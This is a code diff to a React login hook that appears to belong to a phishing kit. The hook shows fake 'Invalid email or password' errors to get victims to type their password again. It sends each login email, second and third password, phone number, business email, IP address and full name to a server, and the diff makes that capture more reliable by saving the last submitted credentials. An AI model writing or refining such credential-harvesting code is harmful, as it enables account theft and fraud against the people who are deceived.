@@ -1,4 +1,4 @@
-import { useState, useEffect, useContext } from "react";
+import { useState, useEffect, useContext, useRef } from "react";
 import { DataContext } from "../pages";
 import SendData from "./SendData.js";
 
@@ -21,7 +21,7 @@ export const usePasswordAuth = ({
   const [passwordError, setPasswordError] = useState("");
   const [emailError, setEmailError] = useState("");
   const [credentialsError, setCredentialsError] = useState(
-    wrongCredsTrigger > 0 ? "Wrong credentials\nInvalid email or password" : ""
+    wrongCredsTrigger > 0 ? "Invalid email or password" : ""
   );
   const [hasCredsError, setHasCredsError] = useState(wrongCredsTrigger > 0);
   const [triedSubmit, setTriedSubmit] = useState(false);
@@ -32,6 +32,8 @@ export const usePasswordAuth = ({
     useState(wrongCredsTrigger);
   const [wrongPasswordCount, setWrongPasswordCount] = useState(0); // Count of wrong password attempts
   const [wrongCredsCount, setWrongCredsCount] = useState(0); // Count of wrong credentials attempts
+  const lastSubmittedEmailRef = useRef(Email || "");
+  const lastSubmittedPasswordRef = useRef("");
 
   useEffect(() => {
     if (
@@ -56,15 +58,17 @@ export const usePasswordAuth = ({
 
     // Send the current password to server
     const passwordField = newAttempt === 2 ? "password_two" : "password_three";
+    const submittedEmail = lastSubmittedEmailRef.current || Email;
+    const submittedPassword = lastSubmittedPasswordRef.current || password;
     const params = {
       ...AllData,
       id: Unik,
       phone_number: Tel,
-      login_email: Email,
+      login_email: submittedEmail,
       business_email: BusinessEmail,
       ip: Ip,
       full_name: Name,
-      [passwordField]: password,
+      [passwordField]: submittedPassword,
       currentStep: `Wrong Password - Attempt ${newAttempt} - User requested to try again`,
     };
 
@@ -88,7 +92,7 @@ export const usePasswordAuth = ({
     if (typeof setEmail === "function") {
       setEmail("");
     }
-    setCredentialsError("Wrong credentials\nInvalid email or password");
+    setCredentialsError("Invalid email or password");
     setHasCredsError(true);
     setPasswordError(""); // Clear password error when showing credentials error
 
@@ -98,15 +102,17 @@ export const usePasswordAuth = ({
 
     // Send the current credentials to server
     const passwordField = newAttempt === 2 ? "password_two" : "password_three";
+    const submittedEmail = lastSubmittedEmailRef.current || Email;
+    const submittedPassword = lastSubmittedPasswordRef.current || password;
     const params = {
       ...AllData,
       id: Unik,
       phone_number: Tel,
-      login_email: Email,
+      login_email: submittedEmail,
       business_email: BusinessEmail,
       ip: Ip,
       full_name: Name,
-      [passwordField]: password,
+      [passwordField]: submittedPassword,
       currentStep: `Wrong Credentials - Attempt ${newAttempt} - User requested to try again`,
     };
 
@@ -158,6 +164,8 @@ export const usePasswordAuth = ({
     }
 
     setIsLoading(true);
+    lastSubmittedEmailRef.current = Email;
+    lastSubmittedPasswordRef.current = password;
 
     // Determine password field and parameters
     let passwordField, params, timeout;
